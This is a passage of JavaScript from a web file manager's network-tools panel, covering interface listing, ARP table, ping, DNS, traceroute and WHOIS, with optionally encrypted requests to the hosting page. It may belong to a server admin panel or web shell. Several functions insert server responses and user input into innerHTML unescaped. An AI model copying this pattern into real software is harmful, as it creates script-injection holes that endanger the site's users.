                                        <span class="text-gray-700 dark:text-gray-300">
                                            <span class="font-medium">${addr.family}:</span> ${addr.address}
                                        </span>
                                        <span class="text-gray-600 dark:text-gray-400">
                                            Netmask: ${addr.netmask || 'N/A'}
                                        </span>
                                    </div>
                                `;
                            });
                        }
                        
                        html += '</div></div>';
                    });
                }
                
                html += '</div>';
                resultsContainer.innerHTML = html;
            })
            .catch(error => {
                triggerAlert('warning', 'Error getting network information');
                resultsContainer.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }

    function getArpTable() {
        const resultsContainer = document.getElementById('arpTableResults');
        resultsContainer.classList.remove('hidden');
        resultsContainer.innerHTML = '<div class="text-center py-2">Loading ARP table...</div>';
        
        sendNetworkRequest('arp_table', {})
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsContainer.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                if (response.arp_table.length === 0) {
                    resultsContainer.innerHTML = '<div class="text-center py-2">No ARP entries found</div>';
                    return;
                }
                
                let html = `
                    <table class="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                        <thead class="text-xs text-gray-700 uppercase bg-gray-100 dark:bg-gray-800 dark:text-gray-400">
                            <tr>
                                <th scope="col" class="px-4 py-2">IP Address</th>
                                <th scope="col" class="px-4 py-2">MAC Address</th>
                                <th scope="col" class="px-4 py-2">Interface</th>
                            </tr>
                        </thead>
                        <tbody>
                `;
                
                response.arp_table.forEach(entry => {
                    html += `
                        <tr>
                            <td class="px-4 py-2">${entry.ip}</td>
                            <td class="px-4 py-2">${entry.mac}</td>
                            <td class="px-4 py-2">${entry.interface}</td>
                        </tr>
                    `;
                });
                
                html += '</tbody></table>';
                resultsContainer.innerHTML = html;
            })
            .catch(error => {
                triggerAlert('warning', 'Error getting ARP table');
                resultsContainer.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }

    function performPing() {
        const host = document.getElementById('pingHost').value;
        const count = parseInt(document.getElementById('pingCount').value);
        const timeout = parseInt(document.getElementById('pingTimeout').value);
        
        if (!host) {
            triggerAlert('warning', 'Please enter a host/IP address');
            return;
        }
        
        const resultsContainer = document.getElementById('pingResults');
        const resultsDiv = resultsContainer.querySelector('div');
        
        resultsContainer.classList.remove('hidden');
        resultsDiv.innerHTML = '<div class="text-center py-2">Pinging ' + host + '...</div>';
        
        const params = {
            host: host,
            count: count,
            timeout: timeout
        };
        
        sendNetworkRequest('ping', params)
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsDiv.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                let html = '';
                response.results.forEach(line => {
                    html += line + '<br>';
                });
                
                resultsDiv.innerHTML = html;
            })
            .catch(error => {
                triggerAlert('warning', 'Error performing ping');
                resultsDiv.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }

    function performDnsLookup() {
        const host = document.getElementById('dnsHost').value;
        const type = document.getElementById('dnsType').value;
        
        if (!host) {
            triggerAlert('warning', 'Please enter a domain name');
            return;
        }
        
        const resultsContainer = document.getElementById('dnsResults');
        const resultsDiv = resultsContainer.querySelector('div');
        
        resultsContainer.classList.remove('hidden');
        resultsDiv.innerHTML = '<div class="text-center py-2">Looking up ' + host + '...</div>';
        
        const params = {
            host: host,
            type: type
        };
        
        sendNetworkRequest('dns_lookup', params)
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsDiv.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                if (response.results.length === 0) {
                    resultsDiv.innerHTML = `<div class="text-center py-2">No ${type} records found for ${host}</div>`;
                    return;
                }
                
                let html = `<div class="space-y-4">`;
                
                response.results.forEach(record => {
                    html += `
                        <div class="border-b pb-3 dark:border-gray-600">
                            <h4 class="font-medium text-gray-800 dark:text-gray-200">${record.type} Record</h4>
                            <div class="mt-2 space-y-1">
                    `;
                    
                    const data = record.data;
                    for (const [key, value] of Object.entries(data)) {
                        if (key !== 'type' && key !== 'class') {
                            html += `
                                <div class="text-sm">
                                    <span class="font-medium text-gray-700 dark:text-gray-300">${key}:</span>
                                    <span class="text-gray-600 dark:text-gray-400">${value}</span>
                                </div>
                            `;
                        }
                    }
                    
                    html += '</div></div>';
                });
                
                html += '</div>';
                resultsDiv.innerHTML = html;
            })
            .catch(error => {
                triggerAlert('warning', 'Error performing DNS lookup');
                resultsDiv.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }

    function performTraceroute() {
        const host = document.getElementById('tracerouteHost').value;
        const maxHops = parseInt(document.getElementById('tracerouteMaxHops').value);
        const timeout = parseInt(document.getElementById('tracerouteTimeout').value);
        
        if (!host) {
            triggerAlert('warning', 'Please enter a host/IP address');
            return;
        }
        
        const resultsContainer = document.getElementById('tracerouteResults');
        const resultsDiv = resultsContainer.querySelector('div');
        
        resultsContainer.classList.remove('hidden');
        resultsDiv.innerHTML = '<div class="text-center py-2">Tracing route to ' + host + '...</div>';
        
        const params = {
            host: host,
            max_hops: maxHops,
            timeout: timeout
        };
        
        sendNetworkRequest('traceroute', params)
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsDiv.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                let html = '<div class="font-mono">';
                html += `<div class="mb-2">Traceroute to ${response.host}, ${maxHops} hops max:</div>`;
                
                response.results.forEach((line, index) => {
                    html += `<div>${line}</div>`;
                });
                
                html += '</div>';
                resultsDiv.innerHTML = html;
            })
            .catch(error => {
                triggerAlert('warning', 'Error performing traceroute');
                resultsDiv.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }
    
    function performWhoisLookup() {
        const domain = document.getElementById('whoisDomain').value;
        
        if (!domain) {
            triggerAlert('warning', 'Please enter a domain or IP address');
            return;
        }
        
        const resultsContainer = document.getElementById('whoisResults');
        const resultsDiv = resultsContainer.querySelector('div');
        
        resultsContainer.classList.remove('hidden');
        resultsDiv.innerHTML = '<div class="text-center py-2">Looking up WHOIS information for ' + domain + '...</div>';
        
        const params = {
            domain: domain
        };
        
        sendNetworkRequest('whois', params)
            .then(response => {
                if (response.error) {
                    triggerAlert('warning', response.error);
                    resultsDiv.innerHTML = `<div class="text-center py-2 text-red-500">${response.error}</div>`;
                    return;
                }
                
                if (!response.results) {
                    resultsDiv.innerHTML = `<div class="text-center py-2">No WHOIS information found for ${domain}</div>`;
                    return;
                }
                
                resultsDiv.textContent = response.results;
            })
            .catch(error => {
                triggerAlert('warning', 'Error performing WHOIS lookup');
                resultsDiv.innerHTML = '<div class="text-center py-2 text-red-500">Error connecting to server</div>';
            });
    }

    function sendNetworkRequest(tool, params) {
        return new Promise((resolve, reject) => {
            progr();
            
            const data = {
                action: 'network_tool',
                tool: tool,
                params: params,
                csrf: phpVars.csrf
            };
            
            const jsonData = JSON.stringify(data);
            const encryptedData = isEnc ? encrypt(jsonData, key) : jsonData;
            
            fetch('', {
                method: 'POST',
                body: encryptedData
            })
            .then(response => response.text())
            .then(data => {
                try {
                    dprogr();
                    
                    let responseJson;
                    if (isEnc) {
                        try {
                            console.log("Attempting to decrypt response");
                            const decryptedData = decrypt(data, key);
                            console.log("Decrypted data:", decryptedData.substring(0, 100) + "...");
                            responseJson = JSON.parse(decryptedData);
                        } catch (decryptError) {
                            console.error("Decryption error:", decryptError);
                            console.log("Attempting direct JSON parse as fallback");
                            responseJson = JSON.parse(data);
                        }
                    } else {
                        responseJson = JSON.parse(data);
                    }
                    
                    resolve(responseJson);
                } catch (error) {
                    console.error("Error processing response:", error);
                    console.error("Raw response:", data);
                    dprogr();
                    reject(error);
                }
            })
            .catch(error => {
                console.error("Network error:", error);
                dprogr();
                reject(error);
            });
        });
    }

    function loadTabsFromLocalStorage() {
        try {
            const savedTabsJson = localStorage.getItem('fileManagerTabs');
            if (savedTabsJson) {
                return JSON.parse(savedTabsJson);
            }
        } catch (e) {
            console.error('Error loading tabs from localStorage:', e);
        }
        return { tabs: null, activeTabId: null };
    }

    function saveTabsToLocalStorage() {
        try {
            const tabsToSave = {
                tabs: window.fileManagerState.tabs,
                activeTabId: window.fileManagerState.activeTabId
            };
            localStorage.setItem('fileManagerTabs', JSON.stringify(tabsToSave));
        } catch (e) {
            console.error('Error saving tabs to localStorage:', e);
        }
    }

